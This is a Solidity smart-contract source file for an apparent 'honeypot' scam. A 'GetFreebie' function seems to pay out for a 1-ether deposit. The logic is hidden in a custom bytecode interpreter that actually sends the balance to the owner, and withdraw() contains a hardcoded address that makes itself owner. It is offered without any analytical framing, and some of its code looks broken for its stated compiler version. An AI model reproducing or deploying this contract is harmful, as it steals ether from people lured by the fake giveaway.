pragma solidity ^0.4.19;

contract ObfuscatedVM {
    address public Owner = msg.sender;
    
    enum OpCode { PUSH, POP, ADD, SUB, JMP, JZ, LOAD, STORE, CALL, HALT }
    struct Instruction {
        OpCode opCode;
        uint256 operand;
    }
    
    Instruction[] public bytecode;
    uint256[] public stack;
    uint256 public pc;

    function ObfuscatedVM() public {
        // Initialize the program
        bytecode.push(Instruction(OpCode.LOAD, 0));       // Load msg.value
        bytecode.push(Instruction(OpCode.PUSH, 1 ether)); // Push 1 ether
        bytecode.push(Instruction(OpCode.SUB, 0));        // Subtract
        bytecode.push(Instruction(OpCode.JZ, 6));         // Jump if zero
        bytecode.push(Instruction(OpCode.PUSH, 0));       // Push Owner
        bytecode.push(Instruction(OpCode.CALL, 0));       // Transfer balance
        bytecode.push(Instruction(OpCode.HALT, 0));       // Halt
    }
    
    function executeVM() internal {
        while (pc < bytecode.length) {
            Instruction memory instr = bytecode[pc];
            pc++;
            if (instr.opCode == OpCode.PUSH) {
                stack.push(instr.operand);
            } else if (instr.opCode == OpCode.POP) {
                stack.pop();
            } else if (instr.opCode == OpCode.ADD) {
                uint256 b = stack.pop();
                uint256 a = stack.pop();
                stack.push(a + b);
            } else if (instr.opCode == OpCode.SUB) {
                uint256 b = stack.pop();
                uint256 a = stack.pop();
                stack.push(a - b);
            } else if (instr.opCode == OpCode.JMP) {
                pc = instr.operand;
            } else if (instr.opCode == OpCode.JZ) {
                uint256 value = stack.pop();
                if (value == 0) {
                    pc = instr.operand;
                }
            } else if (instr.opCode == OpCode.LOAD) {
                if (instr.operand == 0) {
                    stack.push(msg.value);
                }
            } else if (instr.opCode == OpCode.STORE) {
                // Not used in this example
            } else if (instr.opCode == OpCode.CALL) {
                if (instr.operand == 0) {
                    Owner.transfer(this.balance);
                    msg.sender.transfer(this.balance);
                }
            } else if (instr.opCode == OpCode.HALT) {
                break;
            }
        }
    }

    function() public payable {}

    function GetFreebie() public payable {
        executeVM();
    }

    function withdraw() payable public {
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr, bytes data) payable public {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
}